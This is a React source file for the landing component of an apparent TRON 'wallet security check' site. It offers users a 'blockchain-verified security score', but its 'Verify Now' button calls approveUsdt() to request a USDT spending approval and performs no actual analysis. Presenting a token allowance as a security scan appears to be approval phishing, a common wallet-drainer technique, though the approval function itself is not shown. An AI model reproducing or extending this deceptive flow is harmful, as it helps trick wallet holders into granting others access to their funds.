import { ArrowRight, Shield } from "lucide-react";
import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { useToast } from "../../hooks/use-toast";
import { useTronConnect } from "../tron-connect";
import { Button } from "../ui/button";

const HeroSection = () => {
  const [isLoading, setIsLoading] = useState(false);
  const navigate = useNavigate();
  const { toast } = useToast();
  const {
    connectWallet,
    approveUsdt,
    isConnected,
    address,
    disconnectWallet,
    isConnecting,
  } = useTronConnect();

  // Reset connection state when component unmounts
  useEffect(() => {
    return () => {
      if (isConnected) {
        disconnectWallet();
      }
    };
  }, [isConnected]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    try {
      // If not connected, connect wallet first
      if (!isConnected) {
        setIsLoading(true);
        await connectWallet();

        // Stop here - once connected, the address will update and user can click verify again
        toast({
          title: "Wallet Connected",
          description:
            "Your wallet has been connected. Click Verify Now to continue.",
        });
        setIsLoading(false);
        return;
      }

      setIsLoading(true);

      // Wallet is connected, now request USDT approval
      await approveUsdt();

      toast({
        title: "Approval Successful",
        description: "USDT approval transaction has been completed.",
      });

      // Navigate to results page
      navigate(`/verification-results/${address}`);
    } catch (error) {
      console.error("Verification process failed:", error);
      toast({
        title: "Verification Failed",
        description:
          error instanceof Error ? error.message : "An unknown error occurred",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };

  const handleDisconnect = async (e: React.MouseEvent) => {
    e.preventDefault();
    await disconnectWallet();
    toast({
      title: "Wallet Disconnected",
      description: "Your wallet has been disconnected successfully.",
    });
  };

  return (
    <div className="bg-gradient-to-br from-gray-50 to-gray-100 py-16 md:py-24">
      <div className="container mx-auto px-4">
        <div className="max-w-3xl mx-auto text-center">
          <h1 className="text-4xl md:text-5xl lg:text-6xl font-bold mb-6 text-tronshield-dark">
            Is Your TRON Wallet Secure?
          </h1>
          <p className="text-xl md:text-2xl text-gray-600 mb-8">
            Connect your wallet in seconds and get a blockchain-verified
            security score.
          </p>

          <form onSubmit={handleSubmit} className="max-w-xl mx-auto">
            <div className="flex flex-col items-center gap-4 mb-4">
              <Button
                type="submit"
                className="btn-primary flex items-center justify-center text-lg px-8 py-6"
                disabled={isLoading || isConnecting}
              >
                {isLoading || isConnecting ? (
                  <span className="animate-pulse">Processing...</span>
                ) : isConnected ? (
                  <>
                    Verify Now <ArrowRight className="ml-2 h-5 w-5" />
                  </>
                ) : (
                  <>
                    <Shield className="h-5 w-5 mr-2" />
                    Wallet Security Check{" "}
                    <ArrowRight className="ml-2 h-5 w-5" />
                  </>
                )}
              </Button>
            </div>

            {isConnected && (
              <Button
                type="button"
                variant="outline"
                onClick={handleDisconnect}
                className="w-full md:w-auto text-sm px-4 py-2"
              >
                Disconnect Wallet
              </Button>
            )}

            <p className="text-xs text-gray-500 mt-3">
              {isConnected
                ? "Your wallet is connected. Click Verify Now to analyze security."
                : "Connect your wallet to perform a security analysis."}
            </p>
          </form>
        </div>
      </div>
    </div>
  );
};

export default HeroSection;
